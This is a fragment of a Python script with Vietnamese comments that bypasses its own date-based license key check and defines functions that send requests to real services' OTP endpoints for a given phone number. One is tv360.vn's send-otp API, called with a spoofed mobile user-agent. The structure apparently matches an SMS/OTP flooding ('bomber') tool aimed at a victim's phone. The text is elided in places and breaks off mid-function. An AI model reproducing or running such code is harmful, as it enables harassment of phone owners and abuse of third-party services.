...
# Tính key như cũ nhưng không kiểm tra nữa
ngay = int(strftime('%d'))
key = str(ngay * 25937 + 469173)

# Tạm bỏ phần lấy link key & nhập key để test
...
# Bypass key
print("\033[1;32m BỎ QUA KIỂM TRA KEY - CHẾ ĐỘ TEST ĐANG HOẠT ĐỘNG")
# Nếu vẫn muốn in link key, uncomment dòng này:
# print(f"\033[1;32m Link lấy key (tạm bỏ): \033[1;33m{link_key}")

# Phần code chính sau đây
def tv360(phone):
    data = '{"msisdn":"phone"}'
    ...
    headers = {
        ...
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.573"
    }
    response = requests.post("https://m.tv360.vn/api/otp/send-otp", headers=headers, data=data)
    print(response.text)
#
def robot(phone):
    cookies = {
